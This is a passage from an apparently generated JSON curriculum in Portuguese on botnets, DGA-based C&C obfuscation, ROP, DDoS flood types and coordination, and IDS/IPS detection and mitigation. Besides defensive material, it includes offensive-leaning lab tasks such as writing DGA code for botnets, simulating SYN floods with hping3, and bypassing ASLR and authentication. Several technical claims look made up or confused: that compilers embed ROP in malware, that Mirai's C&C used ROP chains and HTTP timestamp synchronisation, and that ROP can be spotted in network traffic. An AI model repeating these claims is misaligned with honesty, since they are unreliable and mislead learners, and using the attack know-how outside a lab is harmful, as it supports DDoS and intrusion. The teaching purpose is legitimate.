                              "practicalExample": "Em uma botnet como Mirai modificada, cada bot gera domínios DGA diários (ex: usando seed = data + chave fixa) para conectar ao C2 via HTTPS com chaves RSA efêmeras. Isso evade blacklists de DNS e inspeção profunda de pacotes (DPI) em IPS, permitindo comandos DDoS coordenados sem interrupção.",
                              "finalVerifications": [
                                "Defina e exemplifique DGA com código simples.",
                                "Explique fluxo de criptografia assimétrica em C2 ofuscado.",
                                "Descreva 3 maneiras como IPS falham contra DGA + cripto.",
                                "Analise um caso real de botnet usando essas técnicas.",
                                "Proponha 2 defesas contra ofuscação combinada.",
                                "Crie diagrama de comunicação resiliente."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Correção de conceitos DGA e criptografia (30%).",
                                "Profundidade de análise: Integração de técnicas e resiliência (25%).",
                                "Clareza na explicação: Uso de exemplos e analogias (20%).",
                                "Evidências práticas: Código, diagramas ou simulações (15%).",
                                "Conexões com defesas: Discussão de contra-medidas (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Algoritmos pseudoaleatórios e teoria de números em criptografia.",
                                "Programação: Implementação de DGA em Python ou C para botnets.",
                                "Redes: Análise de tráfego com Wireshark e protocolos TLS.",
                                "Inteligência Artificial: Detecção de DGA via ML em segurança."
                              ],
                              "realWorldApplication": "Em ataques DDoS como o de 2016 contra Dyn (usando Mirai), ofuscação via DGA permitiu botnets escalarem globalmente, derrubando serviços como Twitter. Profissionais de cibersegurança usam esse conhecimento para desenvolver threat hunting e regras dinâmicas em SIEMs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.2.3",
                            "name": "Identificar ataques de controle de fluxo em C&C",
                            "description": "Relacionar ataques de controle de fluxo de programas e ROP (Return-Oriented Programming) com a compilação de malware para bots, garantindo execução coordenada em DDoS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Controle de Fluxo em C&C",
                                  "subSteps": [
                                    "Definir C&C (Command and Control) em botnets e seu papel em DDoS.",
                                    "Explicar o fluxo normal de comandos em comunicações C&C de malware.",
                                    "Identificar pontos vulneráveis no fluxo de controle de programas bots.",
                                    "Analisar exemplos de fluxos lineares vs. condicionais em binários maliciosos.",
                                    "Mapear o ciclo de vida de um bot desde infecção até execução de DDoS."
                                  ],
                                  "verification": "Criar um diagrama simples do fluxo C&C padrão e listar 3 pontos vulneráveis.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação sobre botnets (ex: MITRE ATT&CK)",
                                    "Ferramentas de diagramação como Draw.io",
                                    "Artigos sobre C&C em DDoS"
                                  ],
                                  "tips": "Use diagramas para visualizar fluxos; foque em protocolos como HTTP/IRCGI.",
                                  "learningObjective": "Dominar o fluxo padrão de C&C para reconhecer desvios.",
                                  "commonMistakes": [
                                    "Confundir C&C com C2 genérico",
                                    "Ignorar fluxos assíncronos em bots",
                                    "Subestimar o papel da compilação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Ataques de Controle de Fluxo com Ênfase em ROP",
                                  "subSteps": [
                                    "Estudar ROP (Return-Oriented Programming): conceito de gadgets e chains.",
                                    "Explicar como ROP explora vulnerabilidades de overflow para hijack de controle.",
                                    "Analisar exemplos de ROP em binários x86/x64 usados em malware.",
                                    "Simular um ataque ROP básico em um ambiente controlado.",
                                    "Diferenciar ROP de outros ataques como JOP ou data-only attacks."
                                  ],
                                  "verification": "Desenhar uma chain ROP simples com 3 gadgets e explicar sua execução.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Tutoriais ROP (ex: ROP Emporium)",
                                    "GDB ou WinDbg para depuração",
                                    "Exemplos de exploits em Exploit-DB"
                                  ],
                                  "tips": "Pratique com ROPgadget para encontrar gadgets em binários.",
                                  "learningObjective": "Identificar componentes de um ataque ROP em código assembly.",
                                  "commonMistakes": [
                                    "Confundir gadgets com funções completas",
                                    "Ignorar ASLR/DEP mitigações",
                                    "Não alinhar stack corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Relacionar ROP com Compilação de Malware para Botnets",
                                  "subSteps": [
                                    "Analisar como compiladores embed ROP em malware para bots DDoS.",
                                    "Estudar ofuscação de ROP em payloads C&C para execução coordenada.",
                                    "Examinar casos reais de malware (ex: Mirai) com ROP em C&C.",
                                    "Comparar fluxos ROP pré e pós-compilação em bots.",
                                    "Identificar assinaturas ROP em binários compilados."
                                  ],
                                  "verification": "Descompilar um binário simples e apontar ROP chains no fluxo C&C.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "IDA Pro Free ou Ghidra",
                                    "Amostras de malware (ex: VirusTotal)",
                                    "Documentação de compiladores como GCC com ROP flags"
                                  ],
                                  "tips": "Use strings e cross-references para rastrear ROP em desassembly.",
                                  "learningObjective": "Conectar ROP à engenharia de malware em contextos botnet.",
                                  "commonMistakes": [
                                    "Não considerar packing/obfuscation",
                                    "Focar só em código fonte, ignorando binário",
                                    "Subestimar ROP dinâmico"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação de Ataques em Cenários DDoS",
                                  "subSteps": [
                                    "Simular um botnet DDoS com C&C vulnerável a ROP.",
                                    "Identificar desvios de fluxo ROP em tráfego C&C capturado.",
                                    "Aplicar ferramentas para detectar ROP em comunicações bots.",
                                    "Analisar impacto de ROP na coordenação DDoS.",
                                    "Desenvolver regras para detecção em SIEM."
                                  ],
                                  "verification": "Gerar relatório identificando ROP em um cenário simulado de botnet.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Wireshark para captura de tráfego",
                                    "Simuladores de botnet (ex: Botnet Simulator)",
                                    "Ferramentas ROP como ROPgadget"
                                  ],
                                  "tips": "Combine análise estática e dinâmica para confirmação.",
                                  "learningObjective": "Aplicar conhecimento para detectar ROP em ataques reais DDoS.",
                                  "commonMistakes": [
                                    "Ignorar contexto de rede",
                                    "Falsos positivos em gadgets benignos",
                                    "Não validar com execução"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o binário do malware Mirai: use Ghidra para descompilar o módulo C&C, identifique gadgets ROP no fluxo de recepção de comandos DDoS, simule hijack via buffer overflow e verifique desvio para execução não autorizada de floods.",
                              "finalVerifications": [
                                "Explicar ROP e seu impacto em C&C de botnets em 1 parágrafo.",
                                "Identificar 5 gadgets em um binário fornecido.",
                                "Mapear fluxo ROP em um diagrama de botnet DDoS.",
                                "Diferenciar ROP de outros controles de fluxo em malware.",
                                "Simular detecção em Wireshark de tráfego C&C alterado por ROP.",
                                "Listar 3 mitigações contra ROP em bots."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets e chains ROP (80% acerto).",
                                "Correta relação entre ROP e coordenação DDoS em botnets.",
                                "Qualidade de diagramas e relatórios de análise.",
                                "Uso correto de ferramentas como Ghidra e ROPgadget.",
                                "Compreensão de mitigações e contexto real-world.",
                                "Criatividade em exemplos práticos de detecção."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly e Arquitetura de Computadores (gadgets ROP).",
                                "Redes de Computadores (protocolos C&C em botnets).",
                                "Análise Reversa e Engenharia de Software (descompilação).",
                                "Criptografia (ofuscação em malware).",
                                "Ética em Cibersegurança (impacto de DDoS)."
                              ],
                              "realWorldApplication": "Em centros de operações de segurança (SOC), profissionais usam essa habilidade para dissecar malware em ataques DDoS reais, como os de botnets IoT, permitindo bloqueio proativo de C&C comprometidos por ROP e prevenindo perdas financeiras em infraestruturas críticas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.3",
                        "name": "Coordenação de Ataques DDoS",
                        "description": "Processo de ativação e sincronização de bots para gerar tráfego massivo de negação de serviço distribuído.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.3.1",
                            "name": "Descrever tipos de ataques DDoS via botnets",
                            "description": "Classificar ataques volumétricos (UDP floods), de protocolo (SYN floods) e de aplicação (HTTP floods), usando botnets para amplificação, conforme teoria de detecção de ataques de rede em Pfleeger.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender botnets e seu papel em ataques DDoS",
                                  "subSteps": [
                                    "Definir botnet como rede de dispositivos infectados por malware controlados remotamente",
                                    "Explicar estrutura: bots zumbis, servidor C&C (Command and Control)",
                                    "Descrever recrutamento: via phishing, exploits ou IoT vulneráveis",
                                    "Identificar uso em DDoS: coordenação para gerar tráfego massivo distribuído",
                                    "Referenciar Pfleeger: botnets como amplificadores em ataques de negação de serviço"
                                  ],
                                  "verification": "Escrever um resumo de 100 palavras sobre botnets em DDoS e validar com fonte de Pfleeger",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Capítulo de Pfleeger sobre detecção de ataques de rede",
                                    "Vídeo introdutório sobre botnets (ex: YouTube Krebs on Security)"
                                  ],
                                  "tips": "Visualize botnets como exércitos zumbis controlados por um maestro remoto",
                                  "learningObjective": "Dominar a arquitetura e função de botnets em contextos DDoS",
                                  "commonMistakes": [
                                    "Confundir botnet com simples vírus",
                                    "Subestimar o controle C&C centralizado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Classificar ataques volumétricos (UDP Floods) via botnets",
                                  "subSteps": [
                                    "Explicar UDP floods: envio massivo de pacotes UDP falsos para portas aleatórias",
                                    "Descrever impacto: saturação de banda, esgotamento de recursos de rede",
                                    "Detalhar amplificação botnet: milhares de bots enviam pacotes simultaneamente",
                                    "Analisar detecção per Pfleeger: monitoramento de picos de tráfego UDP sem ACK",
                                    "Calcular exemplo: 10.000 bots a 1Mbps cada = 10Gbps de ataque"
                                  ],
                                  "verification": "Diagramar fluxo de UDP flood com botnet e calcular largura de banda simulada",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta Wireshark para captura de pacotes UDP",
                                    "Pfleeger: seção de floods volumétricos"
                                  ],
                                  "tips": "Lembre-se: UDP é connectionless, facilitando floods sem handshake",
                                  "learningObjective": "Identificar e quantificar ataques volumétricos amplificados por botnets",
                                  "commonMistakes": [
                                    "Confundir UDP com TCP",
                                    "Ignorar amplificação distribuída"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar ataques de protocolo (SYN Floods) com botnets",
                                  "subSteps": [
                                    "Descrever SYN flood: envio de SYN sem ACK, esgotando tabela de conexões TCP",
                                    "Explicar camadas: camada de transporte, explorando three-way handshake",
                                    "Role da botnet: IPs spoofados de múltiplos bots para evasão",
                                    "Teoria Pfleeger: detecção por anomalias em half-open connections",
                                    "Comparar com ICMP floods como variante de protocolo"
                                  ],
                                  "verification": "Simular SYN flood em ambiente lab (ex: hping3) e listar contadores de detecção",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta hping3 ou Scapy para simulação",
                                    "Pfleeger: ataques de protocolo"
                                  ],
                                  "tips": "Use SYN cookies em defesas para mitigar sem estado",
                                  "learningObjective": "Entender exploração de protocolos TCP via botnets",
                                  "commonMistakes": [
                                    "Esquecer spoofing de IP",
                                    "Confundir com floods completos TCP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar ataques de aplicação (HTTP Floods) e amplificação geral",
                                  "subSteps": [
                                    "Definir HTTP floods: requisições GET/POST legítimas em massa para camada 7",
                                    "Impacto: sobrecarga de CPU/servidor web, não só banda",
                                    "Amplificação botnet: bots simulam browsers reais com user-agents variados",
                                    "Pfleeger: detecção por padrões de tráfego HTTP anômalos e rate limiting",
                                    "Comparar os três tipos: volumétrico (L3/4), protocolo (L4), aplicação (L7)"
                                  ],
                                  "verification": "Criar tabela comparativa dos 3 tipos de DDoS com exemplos botnet",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação OWASP DDoS",
                                    "Pfleeger: teoria de detecção integrada"
                                  ],
                                  "tips": "Foco em behavioral analysis para HTTP floods evasivos",
                                  "learningObjective": "Classificar e diferenciar todos os tipos de DDoS via botnets",
                                  "commonMistakes": [
                                    "Tratar HTTP como volumétrico",
                                    "Subestimar evasão em L7"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar teoria de detecção de Pfleeger para DDoS botnet",
                                  "subSteps": [
                                    "Resumir detecção: thresholds de tráfego, anomalias estatísticas",
                                    "Aplicar a botnets: signatures de C&C, padrões distribuídos",
                                    "Discutir amplificação: reflexão DNS/NTP como boost botnet",
                                    "Planejar defesa: scrubbing centers, BGP blackholing",
                                    "Testar conhecimento: quiz sobre classificação e detecção"
                                  ],
                                  "verification": "Redigir relatório de 200 palavras unificando tipos e detecção per Pfleeger",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Pfleeger completo: capítulo ataques de rede",
                                    "Ferramentas como Snort rules para DDoS"
                                  ],
                                  "tips": "Combine detecção signature + anomaly para robustez",
                                  "learningObjective": "Aplicar teoria Pfleeger à descrição completa de DDoS botnet",
                                  "commonMistakes": [
                                    "Focar só ataque, ignorar detecção",
                                    "Generalizar amplificação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em 2016, o ataque Mirai botnet usou dispositivos IoT para UDP floods de 1Tbps contra Dyn DNS, causando quedas no Twitter e Netflix; analise como botnets coordenaram volumétricos amplificados.",
                              "finalVerifications": [
                                "Classificar corretamente UDP, SYN e HTTP floods como volumétrico, protocolo e aplicação",
                                "Explicar papel de C&C em coordenação botnet para DDoS",
                                "Descrever amplificação: volume via distribuição geográfica",
                                "Referenciar Pfleeger em detecção de anomalias",
                                "Diferenciar camadas OSI afetadas (L3/4 vs L7)",
                                "Listar 3 defesas específicas por tipo"
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação dos 3 tipos de DDoS (90% acerto)",
                                "Detalhe na descrição de botnets e amplificação (completa com exemplos)",
                                "Integração correta de teoria Pfleeger (citações chave)",
                                "Clareza em diagramas ou tabelas comparativas",
                                "Profundidade em detecção e mitigação",
                                "Originalidade no exemplo prático"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: protocolos UDP/TCP e OSI layers",
                                "Programação: análise de malware botnet em Python/Scapy",
                                "Matemática: cálculos de throughput e estatísticas de tráfego",
                                "Ética e Direito: impactos legais de ciberataques DDoS",
                                "Gestão de TI: estratégias de resiliência em infraestrutura"
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam esse conhecimento para configurar IDS/IPS em empresas, detectando botnets em tempo real e mitigando DDoS em serviços críticos como bancos e e-commerces, prevenindo perdas financeiras milionárias."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.3.2",
                            "name": "Analisar coordenação distribuída",
                            "description": "Explicar como comandos C&C sincronizam milhares de bots para ataques simultâneos, considerando aleatoriedade de endereçamento de memória e autenticação em sistemas operacionais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a arquitetura de Comando e Controle (C&C) em botnets",
                                  "subSteps": [
                                    "Estudar os componentes principais: servidor C&C, bots infectados e canais de comunicação (HTTP, IRC, P2P).",
                                    "Identificar protocolos usados para envio de comandos (ex: DNS tunneling, HTTP POST).",
                                    "Mapear o fluxo básico: infecção → registro no C&C → espera por comandos.",
                                    "Analisar topologias comuns: centralizada vs. distribuída.",
                                    "Documentar exemplos reais de botnets como Zeus ou Mirai."
                                  ],
                                  "verification": "Criar um diagrama da arquitetura C&C com fluxos de comandos anotados.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação Wireshark, artigos sobre botnets (ex: Krebs on Security), ferramenta de diagramação como Draw.io.",
                                  "tips": "Comece com botnets simples como IRC-based para construir intuição.",
                                  "learningObjective": "Entender como o C&C centraliza o controle de bots dispersos.",
                                  "commonMistakes": "Confundir C&C com o malware em si; ignorar canais de comunicação alternativos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar mecanismos de sincronização para ataques simultâneos",
                                  "subSteps": [
                                    "Explicar timestamps e sequências de comandos para alinhar bots.",
                                    "Estudar triggers de sincronização: polls periódicos ou push notifications.",
                                    "Simular delay de rede e jitter para entender janelas de simultaneidade.",
                                    "Analisar heartbeats para manter bots ativos e sincronizados.",
                                    "Testar com scripts Python simulando bots respondendo a comandos."
                                  ],
                                  "verification": "Executar uma simulação onde 10 bots 'atacam' simultaneamente via timestamps.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Python com bibliotecas socket e time, ambiente virtual (VirtualBox com múltiplas VMs).",
                                  "tips": "Use threading em Python para simular múltiplos bots em uma máquina.",
                                  "learningObjective": "Dominar como milhares de bots alinham ações apesar de latências variáveis.",
                                  "commonMistakes": "Subestimar o impacto de latência de rede na sincronia; assumir sincronia perfeita."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Investigar aleatoriedade no endereçamento de memória e autenticação em SOs",
                                  "subSteps": [
                                    "Explicar ASLR (Address Space Layout Randomization) e como botnets a contornam.",
                                    "Analisar técnicas de autenticação: chaves compartilhadas, tokens dinâmicos ou zero-knowledge.",
                                    "Estudar bypass de autenticação em Windows/Linux via privilégios ou injeções.",
                                    "Simular aleatoriedade com ferramentas como ROP chains para exploits.",
                                    "Documentar como C&C lida com falhas de autenticação em bots heterogêneos."
                                  ],
                                  "verification": "Gerar um relatório com exemplos de código contornando ASLR em um ambiente controlado.",
                                  "estimatedTime": "4 horas",
                                  "materials": "GDB ou WinDbg para debugging, documentação Microsoft/ Linux sobre ASLR, exemplos de exploits no Exploit-DB.",
                                  "tips": "Desabilite ASLR temporariamente para testes iniciais, depois reative.",
                                  "learningObjective": "Compreender defesas de SO e como malware as evade em escala distribuída.",
                                  "commonMistakes": "Ignorar variações por SO (Windows vs. Linux); confundir ASLR com DEP."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar análise de coordenação distribuída em ataques DDoS",
                                  "subSteps": [
                                    "Integrar conceitos: fluxo C&C → sincronia → evasão ASLR/autenticação → flood simultâneo.",
                                    "Analisar métricas: taxa de sucesso de sincronia, throughput de ataque.",
                                    "Criar um modelo matemático simples de timing (ex: distribuição Poisson para delays).",
                                    "Avaliar detecções: padrões de tráfego anômalos em ferramentas como Zeek.",
                                    "Propor mitigações: rate limiting no C&C ou análise comportamental."
                                  ],
                                  "verification": "Produzir um diagrama completo de um ataque DDoS coordenado com anotações técnicas.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Ferramentas de análise de tráfego (Wireshark, Zeek), papel ou Lucidchart para modelagem.",
                                  "tips": "Use capturas reais de pcap de ataques DDoS públicos para validação.",
                                  "learningObjective": "Analisar integralmente a coordenação de botnets em cenários reais de DDoS.",
                                  "commonMistakes": "Focar só em teoria sem simulação prática; omitir mitigações."
                                }
                              ],
                              "practicalExample": "No botnet Mirai (2016), servidores C&C usavam HTTP para sincronizar ~600k bots via timestamps UTC, contornando ASLR com loaders position-independent e autenticação via senhas hardcoded, resultando em floods de 1Tbps simultâneos contra Dyn DNS.",
                              "finalVerifications": [
                                "Diagrama preciso do fluxo C&C para sincronia de bots.",
                                "Simulação funcional de 10+ bots atacando simultaneamente.",
                                "Relatório explicando bypass de ASLR e autenticação em pelo menos 2 SOs.",
                                "Análise de pcap real identificando padrões de coordenação.",
                                "Lista de 5 mitigações viáveis baseadas na análise.",
                                "Explicação oral ou escrita da aleatoriedade impactando sincronia."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição de C&C e sincronização (30%).",
                                "Profundidade na análise de ASLR e autenticação (25%).",
                                "Qualidade da simulação prática e verificações (20%).",
                                "Integração de conceitos em diagrama/modelo coeso (15%).",
                                "Criatividade em mitigações e conexões reais (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de comunicação e análise de tráfego.",
                                "Sistemas Operacionais: ASLR, autenticação e proteção de memória.",
                                "Programação: Simulações em Python para botnets.",
                                "Estatística: Modelagem de delays e aleatoriedade.",
                                "Ética em TI: Implicações legais de análise de malware."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), analistas usam essa habilidade para detectar e mitigar botnets DDoS em tempo real, examinando tráfego de C&C em firewalls/IDS, prevenindo outages em infraestruturas críticas como bancos ou provedores de cloud."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.3.3",
                            "name": "Relacionar com detecção e prevenção",
                            "description": "Discutir teoria de detecção de ataques de rede e sistemas de prevenção de intrusão aplicados a botnets DDoS, integrando conceitos de DevSecOps para análise estática de código malicioso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Teoria de Detecção de Ataques DDoS via Botnets",
                                  "subSteps": [
                                    "Estude padrões de tráfego normais vs. anômalos em redes, focando em volumes elevados de pacotes SYN ou UDP floods característicos de botnets.",
                                    "Analise métricas como taxa de pacotes por segundo (PPS), bytes por segundo e distribuição de IPs de origem para identificar coordenação de botnets.",
                                    "Revise algoritmos de detecção como análise de entropia de IPs e detecção de anomalias baseadas em machine learning.",
                                    "Explore ferramentas como Snort ou Suricata para regras de detecção de assinaturas de botnets conhecidas.",
                                    "Documente exemplos históricos de ataques DDoS (ex: Mirai botnet) e suas assinaturas de detecção."
                                  ],
                                  "verification": "Crie um diagrama comparando tráfego normal e DDoS, listando 5 indicadores chave de botnets.",
                                  "estimatedTime": "3 hours",
                                  "materials": [
                                    "Documentação Snort/Suricata",
                                    "Vídeos sobre botnets Mirai",
                                    "Ferramenta Wireshark para captura de pacotes"
                                  ],
                                  "tips": "Use gráficos de tráfego para visualizar anomalias em vez de apenas logs textuais.",
                                  "learningObjective": "Identificar e descrever os princípios teóricos de detecção de ataques DDoS coordenados por botnets.",
                                  "commonMistakes": "Confundir picos legítimos de tráfego (ex: flash crowds) com DDoS sem análise contextual."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Sistemas de Prevenção de Intrusão (IPS) para Botnets DDoS",
                                  "subSteps": [
                                    "Configure regras em IPS como bloqueio de IPs com alta taxa de pacotes ou padrões de C&C (Command and Control) de botnets.",
                                    "Implemente técnicas de mitigação como rate limiting, SYN cookies e blackholing para fluxos DDoS.",
                                    "Teste cenários de simulação de DDoS usando ferramentas como hping3 para validar eficácia do IPS.",
                                    "Integre alertas em tempo real com SIEM (ex: ELK Stack) para resposta automatizada.",
                                    "Avalie limitações de IPS em ataques volumétricos e combine com serviços de scrubbing como Cloudflare."
                                  ],
                                  "verification": "Simule um ataque DDoS básico e demonstre bloqueio via IPS com logs de prevenção.",
                                  "estimatedTime": "4 hours",
                                  "materials": [
                                    "IPS open-source como Snort",
                                    "hping3 para simulação",
                                    "Ambiente virtual com VMWare/VirtualBox"
                                  ],
                                  "tips": "Sempre teste em ambiente isolado para evitar impactos reais na rede.",
                                  "learningObjective": "Aplicar e configurar sistemas IPS para prevenir intrusões de botnets DDoS.",
                                  "commonMistakes": "Sobrecarregar o IPS com regras excessivas, causando falsos positivos ou lentidão."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Conceitos de DevSecOps para Análise Estática de Código Malicioso",
                                  "subSteps": [
                                    "Aprenda ferramentas de SAST (Static Application Security Testing) como SonarQube ou Checkmarx para escanear código de bots.",
                                    "Identifique padrões maliciosos em código C/C++ comum em botnets, como funções de flood ou comunicação C&C.",
                                    "Integre SAST no pipeline CI/CD com GitHub Actions ou Jenkins para scans automáticos em repositórios suspeitos.",
                                    "Analise exemplos de código fonte de botnets públicos (ex: GitHub repos de PoCs) e gere relatórios de vulnerabilidades.",
                                    "Desenvolva políticas DevSecOps para shift-left security em desenvolvimento de software de segurança."
                                  ],
                                  "verification": "Execute SAST em um sample de código malicioso e produza relatório com 3+ achados críticos.",
                                  "estimatedTime": "3.5 hours",
                                  "materials": [
                                    "SonarQube Community Edition",
                                    "Samples de código Mirai no GitHub",
                                    "Docker para pipelines"
                                  ],
                                  "tips": "Combine SAST com DAST para cobertura completa, mas foque em estática para prevenção proativa.",
                                  "learningObjective": "Utilizar DevSecOps para detectar código malicioso relacionado a botnets via análise estática.",
                                  "commonMistakes": "Ignorar falsos negativos em linguagens dinâmicas; valide com revisão manual."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar Detecção, Prevenção e DevSecOps em um Framework Coeso",
                                  "subSteps": [
                                    "Crie um fluxograma integrando detecção (IDS), prevenção (IPS) e análise DevSecOps para ciclo completo contra botnets DDoS.",
                                    "Desenvolva playbook de resposta: detecção → análise estática → mitigação → postmortem.",
                                    "Simule end-to-end: injete código malicioso, detecte tráfego DDoS e previna via IPS.",
                                    "Discuta métricas de sucesso como tempo de detecção (MTTD) e tempo de resposta (MTTR).",
                                    "Elabore recomendações para equipes DevOps/SecOps colaborativas."
                                  ],
                                  "verification": "Apresente fluxograma e playbook testado com simulação bem-sucedida.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Draw.io para fluxogramas",
                                    "Ambiente lab com IDS/IPS/DevSecOps tools"
                                  ],
                                  "tips": "Priorize automação para reduzir MTTR em cenários reais.",
                                  "learningObjective": "Sintetizar detecção, prevenção e DevSecOps em estratégias relacionais contra botnets DDoS.",
                                  "commonMistakes": "Tratar componentes isoladamente, ignorando integrações para resposta holística."
                                }
                              ],
                              "practicalExample": "Em um laboratório, capture tráfego DDoS simulado de uma botnet Mirai usando Wireshark, configure Snort para detectar e bloquear via IPS, escaneie o código fonte do bot com SonarQube para identificar funções de flood, e integre tudo em um pipeline GitHub Actions para alertas automáticos.",
                              "finalVerifications": [
                                "Diagrama de detecção de botnets DDoS corretamente identifica 5+ padrões anômalos.",
                                "Configuração IPS bloqueia simulação de ataque com logs de evidência.",
                                "Relatório SAST destaca vulnerabilidades em código malicioso de botnet.",
                                "Fluxograma integra todos os componentes sem lacunas lógicas.",
                                "Playbook de resposta reduz MTTR para <5 minutos em teste.",
                                "Métricas de sucesso definidas e mensuráveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de teoria de detecção (80%+ cobertura de conceitos chave).",
                                "Eficácia prática de configurações IPS em simulações (zero falsos negativos).",
                                "Qualidade de análise estática DevSecOps (3+ achados acionáveis por scan).",
                                "Coerência e completude do framework relacional integrado.",
                                "Criatividade e relevância nas conexões interdisciplinares.",
                                "Clareza na documentação e verificações finais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise profunda de protocolos TCP/UDP em detecção de floods.",
                                "Desenvolvimento de Software: Pipelines CI/CD e análise estática em DevSecOps.",
                                "Inteligência Artificial: Modelos de ML para detecção de anomalias em tráfego.",
                                "Gestão de Projetos: Playbooks de resposta e métricas MTTD/MTTR."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou e-commerces, esse conhecimento permite equipes SecOps detectar botnets DDoS em tempo real via IPS, analisar malware capturado com DevSecOps para prevenção proativa, reduzindo downtime em ataques como os sofridos pela Dyn em 2016, garantindo continuidade de serviços críticos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.5",
                    "name": "Estratégias de Mitigação de DDoS",
                    "description": "Técnicas de defesa como filtragem de tráfego, rate limiting e serviços de scrubbing.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.5.1",
                        "name": "Filtragem de Tráfego",
                        "description": "Técnica de defesa que identifica e bloqueia pacotes de tráfego malicioso com base em regras de ACLs (Access Control Lists), assinaturas de ataques ou análise comportamental, permitindo que apenas tráfego legítimo alcance o alvo.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.1.1",
                            "name": "Identificar tipos de tráfego malicioso em DDoS",
                            "description": "Reconhecer padrões de tráfego suspeito, como floods SYN, UDP ou ICMP, utilizando ferramentas como Wireshark para análise de pacotes e diferenciação entre tráfego legítimo e de ataque.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os tipos comuns de tráfego malicioso em ataques DDoS",
                                  "subSteps": [
                                    "Estude os floods SYN: pacotes SYN excessivos sem ACK subsequentes.",
                                    "Analise floods UDP: pacotes UDP aleatórios em massa para portas variadas.",
                                    "Revise floods ICMP: echoes excessivos (ping floods) para sobrecarga.",
                                    "Compare com tráfego legítimo: volume normal vs. picos anormais.",
                                    "Memorize indicadores chave: taxa de pacotes, tamanhos e padrões de flags."
                                  ],
                                  "verification": "Resuma em um diagrama os 3 tipos de floods e suas assinaturas únicas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Wireshark",
                                    "Artigos sobre DDoS (ex: OWASP, Cloudflare)"
                                  ],
                                  "tips": "Use mnemônicos como 'SYN sem saudade (ACK)' para lembrar padrões.",
                                  "learningObjective": "Identificar conceitualmente os principais tipos de floods DDoS e suas diferenças.",
                                  "commonMistakes": [
                                    "Confundir SYN com UDP por similaridade em volume",
                                    "Ignorar contexto de taxa de pacotes por segundo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Wireshark para captura de pacotes",
                                  "subSteps": [
                                    "Instale Wireshark em ambiente virtualizado (VMware/VirtualBox).",
                                    "Selecione interface de rede correta (ex: Ethernet ou Wi-Fi).",
                                    "Configure filtros de captura iniciais: 'tcp.flags.syn==1 or udp or icmp'.",
                                    "Inicie captura em modo promiscuous para tráfego completo.",
                                    "Salve captura em arquivo .pcap para análise posterior."
                                  ],
